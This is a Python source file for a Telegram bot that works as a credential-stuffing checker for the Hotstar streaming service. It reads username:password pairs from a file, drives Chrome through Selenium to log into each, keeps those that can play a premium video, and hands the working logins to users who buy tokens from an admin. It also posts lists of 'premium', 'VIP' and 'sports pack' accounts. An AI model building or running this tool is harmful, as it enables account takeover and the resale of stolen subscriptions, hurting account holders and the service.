# co-created by https://github.com/RonyGigi


from selenium import webdriver
import time
from selenium.webdriver.common.keys import Keys
from telegram.ext import Updater, CommandHandler
import random
import string


# bot_token=''
bot_token = ''

updater = Updater(token=bot_token)
dispatcher = updater.dispatcher
jq = updater.job_queue


global admin_list
admin_list = []
jq = updater.job_queue


global tokens
tokens = []


def hotstar_fetcher():
    driver = webdriver.Chrome("")
    f = open("data.txt", "r")
    a = f.readlines()

    for i in a:
        b = i.split(":")
        username = b[0]
        password = b[1]
        print(username, password)
        try:  # to handle(sometimes otp asked before password)
            driver.get('https://www.hotstar.com/subscribe/sign-in')
            a = driver.find_element_by_class_name('email-fb-button')
            a.click()
            a = driver.find_element_by_id('emailID')
            a.send_keys(username+Keys.ENTER)
            time.sleep(1)
            a = driver.find_element_by_id('password')
            a.send_keys(password+Keys.ENTER)
            time.sleep(2)
            try:
                a = driver.find_element_by_class_name('error-txt').text
                if(a == "You entered incorrect password. Please check and enter correct password."):
                    print("WrongCredentials!!\n")
            except:

                driver.get(
                    "https://www.hotstar.com/tv/game-of-thrones/s-510/winterfell/1770005120")
                time.sleep(3)

                try:  # to handle(sometimes video playes directly without "heading" class for premiumaccounts)
                    a = driver.find_element_by_class_name("heading")
                    heading = a.text
                    if(heading == "Sorry, more than one premium video is being requested from this account. Please close other videos and try again." or heading == "You need a Premium Membership to watch this video."):
                        print("Being Used or Not Premium!\n")
                    else:
                        print("\nFOUND!! >> "+username+" : "+password)
                        b = username+" : "+password
                        driver.quit()
                        return b
                    driver.get('https://www.hotstar.com/subscribe/my-account')
                    time.sleep(4)
                    driver.find_element_by_class_name("sign-out-link").click()
                    time.sleep(2)
                except:
                    print("\nFOUND!! >> "+username+" : "+password)
                    b = username+" : "+password
                    driver.quit()
                    return b

        except Exception as e:
            try:
                driver.get('https://www.hotstar.com/subscribe/my-account')
                time.sleep(4)
                driver.find_element_by_class_name("sign-out-link").click()
                time.sleep(2)
                print(e)
            except:
                pass

    try:
        a.close()
        driver.quit()
    except:
        pass


def start(bot, update):
    print("inside start\n")
    bot.send_message(chat_id=update.message.chat_id,
                     text="Welcome To Hotstarbot!")


def generate(bot, update, args="hhhhhh"):
    global admin_list
    global tokens
    try:
        token_recieved = args[0]
    except:
        token_recieved = "no token recieved"
    # print(token_recieved,tokens)
    # print(str(token_recieved) in tokens)
    print("Inside Generate!")
    if(str(update.message.chat_id) in admin_list or str(token_recieved) in tokens):
        print("admin or premium user")
        bot.send_message(chat_id=update.message.chat_id,
                         text="*PREMIUM USER*\nPlease Wait While We Cook Some Premium Accounts!\n\nNote:Token is valid for 1 day.", parse_mode="Markdown")
        a = hotstar_fetcher()
        a = "*ENJOY!*\n`"+a+"`"
        bot.send_message(chat_id=update.message.chat_id,
                         text=a, parse_mode="Markdown")
    elif(str(token_recieved) not in tokens and str(token_recieved) != "no token recieved"):
        print("Token Expired or Invalid Token!")
        bot.send_message(chat_id=update.message.chat_id,
                         text="Token Expired or Invalid token\nContact Admin to Buy Token")
    elif(token_recieved == "no token recieved"):
        print("Buy Tokens!")
        bot.send_message(chat_id=update.message.chat_id,
                         text="Enter '/generate token'\nBuy token from Admin")


def premium(bot, update):
    print("premium!")

    f = open("premium.txt", "r")
    a = f.readlines()
    count = 1
    c = ""
    for i in a:
        if(count <= 5):
            print(i)
            c += i+"\n"
        else:
            break
        count += 1

    c = "*PREMIUM*\n`"+c+"`"
    bot.send_message(chat_id=update.message.chat_id,
                     text=c, parse_mode="Markdown")


def vip(bot, update):
    print("vip!")

    f = open("vip.txt", "r")
    a = f.readlines()
    count = 1
    c = ""
    for i in a:
        if(count <= 5):
            print(i)
            c += i+"\n"
        else:
            break
        count += 1

    c = "*VIP*\n`"+c+"`"
    bot.send_message(chat_id=update.message.chat_id,
                     text=c, parse_mode="Markdown")


def sportspack(bot, update):
    print("sports pack!")

    f = open("sportspack.txt", "r")
    a = f.readlines()
    count = 1
    c = ""
    for i in a:
        if(count <= 5):
            print(i)
            c += i+"\n"
        else:
            break
        count += 1

    c = "*SPORTS PACK*\n`"+c+"`"
    bot.send_message(chat_id=update.message.chat_id,
                     text=c, parse_mode="Markdown")


def randomString(stringLength=8):
    letters = string.ascii_letters
    return ''.join(random.choice(letters) for i in range(stringLength))


def token(bot, update):
    global tokens
    global admin_list
    if(str(update.message.chat_id) in admin_list):
        tok = randomString(8)
        print(tok)
        tokens.append(tok)
        c = "*TOKEN*\n\n`"+tok+"`\n\n*__________*"
        bot.send_message(chat_id=update.message.chat_id,
                         text=c, parse_mode="Markdown")
        print(tokens)


dispatcher.add_handler(CommandHandler("start", start))
dispatcher.add_handler(CommandHandler("generate", generate, pass_args=True))
dispatcher.add_handler(CommandHandler("premium", premium))
dispatcher.add_handler(CommandHandler("vip", vip))
dispatcher.add_handler(CommandHandler("sportspack", sportspack))
dispatcher.add_handler(CommandHandler("token", token))

updater.start_polling()


def init_bknd():
    print("Bot Started!")


if __name__ == "__main__":
    init_bknd()
